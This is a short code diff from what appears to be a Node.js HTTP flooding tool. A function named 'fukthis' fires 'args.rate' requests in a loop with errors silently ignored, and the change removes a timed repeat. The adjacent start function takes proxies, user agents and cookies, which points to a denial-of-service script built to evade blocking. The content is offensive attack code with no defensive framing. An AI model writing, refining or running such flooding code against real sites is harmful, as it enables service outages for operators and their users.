@@ -2,13 +2,11 @@ const request = require('request');
 
 
 async function fukthis(obj, args){
-    setInterval(() => {
-        try{
-            for(let i = 0; i < args.rate; i++) {
-                request(obj);
-            }
-        } catch(e){}
-    }, (args.delay * 1000));
+    try {
+        for(let i = 0; i < args.rate; i++) {
+            request(obj);
+        }
+    } catch(e){}
 }
 
 function start(args, proxy, ua, secondcookies){
